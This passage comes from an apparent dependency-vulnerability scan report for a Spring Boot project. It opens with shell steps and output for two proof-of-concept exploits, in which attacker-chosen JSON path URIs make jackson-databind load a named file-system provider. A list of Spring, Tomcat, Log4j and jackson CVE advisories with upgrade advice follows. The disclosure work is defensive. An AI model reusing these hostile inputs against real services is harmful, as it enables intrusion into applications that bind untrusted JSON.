# 0. Locate the three published dependency jars.
M2="$HOME/.m2/repository"
DB="$M2/tools/jackson/core/jackson-databind/3.2.1/jackson-databind-3.2.1.jar"
CORE="$M2/tools/jackson/core/jackson-core/3.2.1/jackson-core-3.2.1.jar"
ANN="$M2/com/fasterxml/jackson/core/jackson-annotations/2.22/jackson-annotations-2.22.jar"
CP="$DB:$CORE:$ANN"

# 1. Compile the three sources.
cd poc-project
mkdir -p out
javac -cp "$CP" -d out \
  src/main/java/com/poc/EvilFileSystemProvider.java \
  src/main/java/com/poc/Vuln04_PathProvider.java \
  src/main/java/com/poc/Vuln04b_PathProviderMount.java

# 2. Put the ServiceLoader descriptor on the runtime classpath (needed by PoC 2).
mkdir -p out/META-INF/services
cp src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider \
   out/META-INF/services/java.nio.file.spi.FileSystemProvider

# 3. Run both PoCs.
java -cp "out:$CP" com.poc.Vuln04_PathProvider        # PoC 1
java -cp "out:$CP" com.poc.Vuln04b_PathProviderMount  # PoC 2
```

## Reproduction Evidence

Executed against jackson-databind 3.2.1 (OpenJDK 25).

**PoC 1 :**
```
Deserializing (default mapper): {"workdir":"jar:file:/tmp/jackson_poc_evil.zip!/x"}
Throwable during resolution: tools.jackson.databind.exc.ValueInstantiationException: Cannot construct instance of `java.nio.file.Path`, problem: `java.nio.file.FileSystemNotFoundException`
 at [Source: REDACTED (`StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION` disabled); byte offset: #UNKNOWN] (through reference chain: com.poc.Vuln04_PathProvider$Config["workdir"])
RESULT: VULNERABLE (attacker URI drove provider resolution; threw ValueInstantiationException inside readValue)
```
Notes: the JDK **built-in** `jar` provider's `getPath` does not auto-mount (it also throws `FileSystemNotFoundException`, since only `newFileSystem` mounts). PoC 1 proves the in-scope defect: attacker input reaches the scheme-driven `ServiceLoader` resolution during `readValue` with no allow-list. PoC 2 only illustrates the downstream mechanism.

**PoC 2  :**
```
Provider static-init ran before deserialization? true
Deserializing (default mapper): {"workdir":"evilscheme://attacker-controlled/target?x=1"}
>>> [EVIL-PROVIDER] getPath() invoked with attacker URI: evilscheme://attacker-controlled/target?x=1
Resolved Path = /var/folders/.../T/evilprovider-marker
Provider static-init ran: true
Provider.getPath() attacker URI: evilscheme://attacker-controlled/target?x=1
RESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)
```
Purely from a JSON string, jackson's `ServiceLoader` fallback selected the attacker-named scheme's provider and invoked `provider.getPath(uri)` with the full attacker URI inside `readValue`. Whether a given provider then does anything harmful is outside the library's control; the in-scope issue is the absence of a scheme restriction before this fallback runs.

## Impact

Untrusted JSON drives `provider.getPath(attackerURI)` on an attacker-chosen provider during `readValue`. With only the JDK built-in providers this is inert. Real impact requires a side-effecting third-party provider on the classpath. The fix is to close the
scheme-restriction gap.

## Recommended Fix

1. **Restrict the resolved scheme to a fixed, hard-coded set** ; reject `jar:` and other schemes via `ctxt.handleWeirdStringValue(...)`. A hard-coded set keeps the fix backport-safe with no new configuration surface.
2. **Skip the `ServiceLoader<FileSystemProvider>` enumeration for disallowed schemes**, so untrusted JSON cannot select and drive an arbitrary registered provider.
3. Document that `java.nio.file.Path`-typed fields should not be bound from untrusted JSON.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.8.0, < 2.18.10
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.10 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-22737: Spring Framework Improper Path Limitation with Script View Templates
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-22737](https://github.com/advisories/GHSA-4773-3jfm-qmx3): Spring Framework Improper Path Limitation with Script View Templates

GHSA: GHSA-4773-3jfm-qmx3
Severity: MEDIUM

Use of Java scripting engine enabled (e.g. JRuby, Jython) template views in Spring MVC and Spring WebFlux applications can result in disclosure of content from files outside the configured locations for script template views. This issue affects Spring Framework: from 7.0.0 through 7.0.5, from 6.2.0 through 6.2.16, from 6.1.0 through 6.1.25, from 5.3.0 through 5.3.46.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: >= 5.3.0, <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-22745: Spring MVC and WebFlux applications are vulnerable to Denial of Service attacks when resolving static resources
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-22745](https://github.com/advisories/GHSA-6p4f-wcwh-5vvm): Spring MVC and WebFlux applications are vulnerable to Denial of Service attacks when resolving static resources

GHSA: GHSA-6p4f-wcwh-5vvm
Severity: MEDIUM

Spring MVC and WebFlux applications are vulnerable to Denial of Service attacks when resolving static resources.


More precisely, an application can be vulnerable when all the following are true:

  *  the application is using Spring MVC or Spring WebFlux
  *  the application is serving static resources from the file system
  *  the application is running on a Windows platform


When all the conditions above are met, the attacker can send malicious requests that are slow to resolve and that can keep HTTP connections in use. This can cause a Denial of Service on the application.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.47
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-25854: Apache Tomcat has an Open Redirect vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-25854](https://github.com/advisories/GHSA-9m3c-qcxr-9x87): Apache Tomcat has an Open Redirect vulnerability

GHSA: GHSA-9m3c-qcxr-9x87
Severity: MEDIUM

Occasional URL redirection to untrusted Site ('Open Redirect') vulnerability in Apache Tomcat via the LoadBalancerDrainingValve.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.18, from 10.1.0-M1 through 10.1.52, from 9.0.0.M23 through 9.0.115, from 8.5.30 through 8.5.100.
Other, unsupported versions may also be affected

Users are recommended to upgrade to version 11.0.20, 10.1.53 or 9.0.116, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 8.5.30, < 9.0.116
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.116 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-41001: Spring Boot: Predictable Temp Directory in Artemis Auto-configuration
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:96

[CVE-2026-41001](https://github.com/advisories/GHSA-ggg2-9786-hwc8): Spring Boot: Predictable Temp Directory in Artemis Auto-configuration

GHSA: GHSA-ggg2-9786-hwc8
Severity: MEDIUM

Spring Boot's ArtemisEmbeddedConfigurationFactory uses a fixed, static path for the embedded Artemis message broker's data directory when no explicit path is configured. A local attacker on the same host can pre-create this predictable directory or place a symlink before the application starts.

Affected versions:
Spring Boot 4.0.0 through 4.0.6; 3.5.0 through 3.5.14; 3.4.0 through 3.4.16; 3.3.0 through 3.3.19; 2.7.0 through 2.7.33.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.boot:spring-boot-autoconfigure:2.7.18; affected range: >= 2.7.0, <= 2.7.33
    - Transitive; pulled by direct root declared at pom.xml:96; scope: compile; full resolved chain: org.springframework.boot:spring-boot-devtools:2.7.18 -> org.springframework.boot:spring-boot-autoconfigure:2.7.18

Recommended fix:
  - org.springframework.boot:spring-boot-autoconfigure: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41706: Spring Security: Open Redirect via Unvalidated Post-Login Redirect URL Stored in CookieRequestCache
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2026-41706](https://github.com/advisories/GHSA-x2r2-rvhq-2mqv): Spring Security: Open Redirect via Unvalidated Post-Login Redirect URL Stored in CookieRequestCache

GHSA: GHSA-x2r2-rvhq-2mqv
Severity: MEDIUM

Spring Security's CookieRequestCache and CookieServerRequestCache store the pre-authentication request URL in a browser cookie so that users can be redirected back to their intended destination after a successful login. In affected versions, the full absolute URL is stored in the cookie and is used without validation as the post-login redirect target.

Affected versions:
Spring Security 5.7.0 through 5.7.23; 5.8.0 through 5.8.25; 6.3.0 through 6.3.16; 6.4.0 through 6.4.16; 6.5.0 through 6.5.10; 7.0.0 through 7.0.5.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-web:5.7.11; affected range: <= 5.7.23
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-web:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-web: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41711: Spring Data Commons: StackOverflowException when parsing Sort parameters (DoS)
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:44

[CVE-2026-41711](https://github.com/advisories/GHSA-5vpf-xvv7-c8vh): Spring Data Commons: StackOverflowException when parsing Sort parameters (DoS)

GHSA: GHSA-5vpf-xvv7-c8vh
Severity: MEDIUM

Applications using Spring Data Commons may be vulnerable to a Denial of Service (DoS) attack leading to a StackOverflowException when parsing Sort parameters.

Affected versions:
Spring Data Commons 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14; 3.3.0 through 3.3.16; 3.2.0 through 3.2.15; 3.1.0 through 3.1.14; 3.0.0 through 3.0.15; 2.7.0 through 2.7.19.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.data:spring-data-commons:2.7.18; affected range: <= 2.7.19
    - Transitive; pulled by direct root declared at pom.xml:44; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-data-jpa:2.7.18 -> org.springframework.data:spring-data-jpa:2.7.18 -> org.springframework.data:spring-data-commons:2.7.18

Recommended fix:
  - org.springframework.data:spring-data-commons: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41721: Spring Data Commons: Denial of Service via excessive memory allocation in projection binding
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:44

[CVE-2026-41721](https://github.com/advisories/GHSA-5m4m-73w9-8433): Spring Data Commons: Denial of Service via excessive memory allocation in projection binding

GHSA: GHSA-5m4m-73w9-8433
Severity: MEDIUM

Spring Data Commons contains a vulnerability that can lead to a Denial of Service (DoS) condition if Spring Data Web Support is enabled in conjunction with a Controller method using @ProjectedPayload, when an attacker sends a specially crafted HTTP request that causes the application to allocate lots of memory.

Affected versions:
Spring Data Commons 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14; 3.3.0 through 3.3.16; 3.2.0 through 3.2.15; 3.1.0 through 3.1.14; 3.0.0 through 3.0.15; 2.7.0 through 2.7.19.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.data:spring-data-commons:2.7.18; affected range: <= 2.7.19
    - Transitive; pulled by direct root declared at pom.xml:44; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-data-jpa:2.7.18 -> org.springframework.data:spring-data-jpa:2.7.18 -> org.springframework.data:spring-data-commons:2.7.18

Recommended fix:
  - org.springframework.data:spring-data-commons: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41841: Spring Framework Information Disclosure via Static Resource Cache in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41841](https://github.com/advisories/GHSA-mq64-j8f9-9gcj): Spring Framework Information Disclosure via Static Resource Cache in Spring MVC and WebFlux

GHSA: GHSA-mq64-j8f9-9gcj
Severity: MEDIUM

Spring MVC and WebFlux applications are vulnerable to Information Disclosure attacks when resolving static resources.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41843: Spring Framework Path Traversal via Versioned Static Resources in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41843](https://github.com/advisories/GHSA-72pg-x5f8-j25j): Spring Framework Path Traversal via Versioned Static Resources in Spring MVC and WebFlux

GHSA: GHSA-72pg-x5f8-j25j
Severity: MEDIUM

Spring MVC and WebFlux applications are vulnerable to Path Traversal attacks when resolving static resources.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41844: Spring Framework Open Redirect in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41844](https://github.com/advisories/GHSA-h3qp-gqrc-q736): Spring Framework Open Redirect in Spring MVC and WebFlux

GHSA: GHSA-h3qp-gqrc-q736
Severity: MEDIUM

A Spring MVC or Spring WebFlux application which configures a mapping for "/**" where the view name is not explicitly specified allows an attacker to craft a link resulting in a 302 redirect to an arbitrary external host via the redirect: prefix.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41846: Spring Framework Cross-site Scripting via JSP Form Tags
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41846](https://github.com/advisories/GHSA-957g-f97v-vppc): Spring Framework Cross-site Scripting via JSP Form Tags

GHSA: GHSA-957g-f97v-vppc
Severity: MEDIUM

Spring MVC applications which accept user-supplied values in the cssClass, cssErrorClass, or cssStyle attributes of JSP form tags allow arbitrary HTML/JavaScript code injection, potentially resulting in a cross-site scripting (XSS) vulnerability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41851: Spring Framework Denial of Service via Unbounded Cache in SpEL
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41851](https://github.com/advisories/GHSA-wxpp-56q6-5pcg): Spring Framework Denial of Service via Unbounded Cache in SpEL

GHSA: GHSA-wxpp-56q6-5pcg
Severity: MEDIUM

Applications which accept user-supplied Spring Expression Language (SpEL) expressions may be vulnerable to a Denial of Service (DoS) attack if the evaluation of a SpEL expression triggers unbounded cache growth.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-expression:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31 -> org.springframework:spring-expression:5.3.31

Recommended fix:
  - org.springframework:spring-expression: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41853: Spring Framework Multipart Request Smuggling in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41853](https://github.com/advisories/GHSA-cjpg-rgq5-fr37): Spring Framework Multipart Request Smuggling in Spring MVC and WebFlux

GHSA: GHSA-cjpg-rgq5-fr37
Severity: MEDIUM

Spring MVC and WebFlux applications are vulnerable to Multipart request smuggling attacks.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-47838: Spring Security Vulnerable to Unauthorized User Impersonation when Using X.509 Client Certificates
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2026-47838](https://github.com/advisories/GHSA-293q-567p-wmwq): Spring Security Vulnerable to Unauthorized User Impersonation when Using X.509 Client Certificates

GHSA: GHSA-293q-567p-wmwq
Severity: MEDIUM

In Spring Security Web, `SubjectDnX509PrincipalExtractor` does not correctly handle certain malformed X.509 certificate CN values, which can lead to reading the wrong value for the username. In a carefully crafted certificate, this can lead to an attacker impersonating another user.

`SubjectDnX509PrincipalExtractor` is deprecated by this CVE and replaced with `SubjectX500PrincipalExtractor`. As part of updating, you should also migrate to `SubjectX500PrincipalExtractor`.

Affected versions:
Spring Security Enterprise 5.7.0 through 5.7.24; 5.8.0 through 5.8.26; 6.3.0 through 6.3.17; 6.4.0 through 6.4.17; 6.5.0 through 6.5.10. 
OSS 6.5.0 through 6.5.10.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-web:5.7.11; affected range: <= 5.7.14
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-web:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-web: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-49844: Apache Log4j API: Improper encoding of non-finite floating-point values during MapMessage JSON serialization
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-49844](https://github.com/advisories/GHSA-qv9r-c865-cp47): Apache Log4j API: Improper encoding of non-finite floating-point values during MapMessage JSON serialization

GHSA: GHSA-qv9r-c865-cp47
Severity: MEDIUM

Improper encoding of non-finite floating-point values during MapMessage JSON serialization in Apache Log4j API produces output that is not valid JSON. This issue affects Apache Log4j API versions 2.13.1 through 2.25.4 and version 2.26.0.

The fix for CVE-2026-34481 did not cover all code paths: when a MapMessage contains a non-finite IEEE 754 value (NaN, Infinity, or -Infinity), MapMessage.asJson() emits the corresponding bare token. RFC 8259 does not permit these tokens, so a conformant parser rejects the resulting document.

The defect is reachable only when both of the following conditions hold:

  *  The application uses the  message resolver https://logging.apache.org/log4j/2.x/manual/json-template-layout.html#event-template-resolver-message  of JsonTemplateLayout or any other layout that relies on MapMessage.asJson() or MapMessage.getFormattedMessage(new String[]{"JSON"}).
  *  The application logs a MapMessage that contains an attacker-controlled floating-point value.


An attacker who can supply a non-finite value can cause the affected layout to emit malformed JSON, which may corrupt the enclosing log record or disrupt downstream log ingestion and parsing.

Users are advised to upgrade to Apache Log4j API 2.25.5 or 2.26.1, both of which emit RFC 8259-compliant JSON for non-finite values.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.logging.log4j:log4j-api:2.17.2; affected range: >= 2.13.1, < 2.25.5
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> org.apache.logging.log4j:log4j-to-slf4j:2.17.2 -> org.apache.logging.log4j:log4j-api:2.17.2

Recommended fix:
  - org.apache.logging.log4j:log4j-api: upgrade to 2.25.5 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-50193: jackson-databind: Deeply nested JsonNode throws StackOverflowError for toString()
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-50193](https://github.com/advisories/GHSA-3wrr-7qpf-2prh): jackson-databind: Deeply nested JsonNode throws StackOverflowError for toString()

GHSA: GHSA-3wrr-7qpf-2prh
Severity: MEDIUM

### Impact

Potential Denial-of-Service when attacker sends deeply nested JSON if (and only if) service:

1. Reads deeply nested (1000s of levels) JSON as `JsonNode` (ObjectMapper.readTree())
2. Writes out same (or modifided) node using `JsonNode.toString()`

which can consume significant amount of resources with concurrent relatively small requests (1000 nested arrays is 2kB).

### Patches

Fixed in 2.14.0 via https://github.com/FasterXML/jackson-databind/issues/3447.

### Workarounds

Avoid serializing `JsonNode` using `toString()`: use ObjectMapper.writeValueAsString(node)

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.10.0, <= 2.13.5
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.14.0 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-54514: jackson-databind: InetSocketAddress deserialization triggers eager DNS resolution (SSRF)
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-54514](https://github.com/advisories/GHSA-hgj6-7826-r7m5): jackson-databind: InetSocketAddress deserialization triggers eager DNS resolution (SSRF)

GHSA: GHSA-hgj6-7826-r7m5
Severity: MEDIUM

## Summary
`JDKFromStringDeserializer` constructed `InetSocketAddress` with `new InetSocketAddress(host, port)`, which performs eager DNS name resolution for hostname inputs at deserialization time. An application that binds untrusted JSON into a type containing an `InetSocketAddress` field issues an attacker-chosen DNS query during `readValue`, before any application-level validation or connect logic. The fix uses `InetSocketAddress.createUnresolved(host, port)`, deferring DNS to an explicit connect.

## Impact
An attacker controlling JSON deserialized into an `InetSocketAddress`-bearing type can force outbound DNS lookups for attacker-chosen hostnames at deserialization time (SSRF / DNS-based out-of-band interaction / internal-resolver probing), purely from binding.

## Affected / Patched (verified via `git tag --contains` on `1f5a103`)
- 2.18 line: `>= 2.18.0, < 2.18.8` -> fixed in **2.18.8**
- 2.19-2.21 line: `>= 2.19.0, < 2.21.4` -> fixed in **2.21.4**
- 3.x line: `>= 3.0.0, < 3.1.4` -> fixed in **3.1.4**

## Severity / CWE
Maintainer: minor. Reporter: LOW. CWE-918 (SSRF).

## Upstream fix
FasterXML/jackson-databind#5951 ("Improve InetSocketAddress deserialization"). Released 2026-06-04 in 2.18.8 / 2.21.4 / 3.1.4.

## Credits
Omkhar Arasaratnam (@omkhar) - finder.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.0.0, < 2.18.8
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.8 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-54515: jackson-databind has case-insensitive deserialization bypasses per-property @JsonIgnoreProperties
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-54515](https://github.com/advisories/GHSA-5jmj-h7xm-6q6v): jackson-databind has case-insensitive deserialization bypasses per-property @JsonIgnoreProperties

GHSA: GHSA-5jmj-h7xm-6q6v
Severity: MEDIUM

## Summary
In `BeanDeserializerBase.createContextual()`, per-property `@JsonIgnoreProperties` exclusions are applied by `_handleByNameInclusion()`, producing a `contextual` deserializer whose `BeanPropertyMap` has the ignored properties removed. The subsequent per-property case-insensitivity block (triggered by `@JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)`) rebuilds from `this._beanProperties` (the original, unfiltered map) instead of `contextual._beanProperties`, then overwrites the filtered map — restoring every property `_handleByNameInclusion` had just removed. The ignored property becomes writable again.

## Impact
An application that both enables case-insensitive matching and relies on per-property `@JsonIgnoreProperties` to keep a field unwritable can have that field set from untrusted JSON (mass-assignment-style write).

## Affected / Patched
Will be fixed in 2.18.9, 2.21.5, 2.22.1 and 3.1.4.

## Severity / CWE
Maintainer: minor. Reporter: Moderate. CWE-915.

## Upstream fix
FasterXML/jackson-databind#5962 (PR #5964, `0e1b0b2`), milestone 3.1.4. Released 2026-06-04.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.8.0, < 2.18.9
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.9 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-77310: jackson-databind: Incomplete fix for CVE-2026-54514: eager DNS resolution (SSRF) still present in InetAddress deserialization
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-77310](https://github.com/advisories/GHSA-vvgp-rfg2-7rr6): jackson-databind: Incomplete fix for CVE-2026-54514: eager DNS resolution (SSRF) still present in InetAddress deserialization

GHSA: GHSA-vvgp-rfg2-7rr6
Severity: MEDIUM

### Summary
CVE-2026-54514 (GHSA-hgj6-7826-r7m5) fixed an eager-DNS-resolution / SSRF issue in jackson-databind's deserialization of `java.net.InetSocketAddress` by switching to `InetSocketAddress.createUnresolved(...)` (PR #5951, commit 1f5a1037, released in 2.18.8 / 2.21.4 / 3.1.4). That fix did not cover the sibling `java.net.InetAddress` branch in the very same `FromStringDeserializer.Std._deserialize()` switch statement, which still calls `InetAddress.getByName(value)` and therefore performs an eager forward DNS lookup on attacker-controlled input at deserialization time. The fix is incomplete: the same vulnerability class remains reachable through `InetAddress`.

### Details
File: src/main/java/com/fasterxml/jackson/databind/deser/std/FromStringDeserializer.java

Sibling cases in the same switch:
- Line 357-358 (UNFIXED):
    case STD_INET_ADDRESS:
        return InetAddress.getByName(value);     // eager forward DNS lookup
- Line 359-381 + helper at 494-496 (FIXED by PR #5951):
    protected InetSocketAddress _inetSocketAddress(String host, int port) {
        // 05-May-2026, tatu: [databind#5951] Prevent DNS lookup:
        return InetSocketAddress.createUnresolved(host, port);   // no DNS
    }

`InetAddress` is a registered standard string-like scalar type (FromStringDeserializer.types() line 73; findDeserializer() maps it to STD_INET_ADDRESS at line 119-120). Any value deserialized into an `InetAddress`-typed target — a plain POJO field, a polymorphic subtype, or a default-typing-permitted slot — reaches `InetAddress.getByName(attackerControlledString)`, which invokes the OS/JVM resolver and performs forward DNS resolution before any application validation.

The parent fix's own added unit test asserts `address.isUnresolved()` with the comment "should NOT resolve address", confirming that performing DNS resolution during deserialization is precisely the behavior being treated as the vulnerability. The InetAddress branch still violates that property.

